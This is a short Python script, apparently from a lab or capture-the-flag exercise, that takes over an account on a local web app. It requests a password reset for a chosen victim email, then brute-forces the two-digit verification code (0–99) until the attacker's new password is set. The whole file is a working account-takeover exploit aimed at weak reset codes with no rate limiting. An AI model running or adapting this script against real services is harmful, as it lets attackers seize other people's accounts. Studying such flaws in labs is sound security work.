import time
import requests

# Create a session object
session = requests.Session()

port_number = input('Enter the port number: ')
email = input('Enter the email you want to compromise: ')
password = input('Enter the password you want to set: ')

FORGOT_PASSWORD_URL = 'http://127.0.0.1:' + str(port_number) + '/forgot_password'
VERIFY_CODE_URL = 'http://127.0.0.1:' + str(port_number) + '/verify-code'

# Use the session object to make requests
forgot_password_response = session.post(
    url=FORGOT_PASSWORD_URL,
    data={'email': email},
    allow_redirects=False
)


if forgot_password_response.status_code == 302:
    print('Forgot password request sent successfully, time to crack the password!')

    for i in range(100):
        verify_code_response = session.post(
            url=VERIFY_CODE_URL,
            data={
                'code': str(i),
                'password': password
            },
            allow_redirects=False  # Disable automatic redirection
        )

        if verify_code_response.status_code == 201:
            print(f'Found the code: {i}')
            print('Password changed successfully!')
            print(f'New password: {password}')
            break

else:
    print('It looks like there is no registered with this email address!')

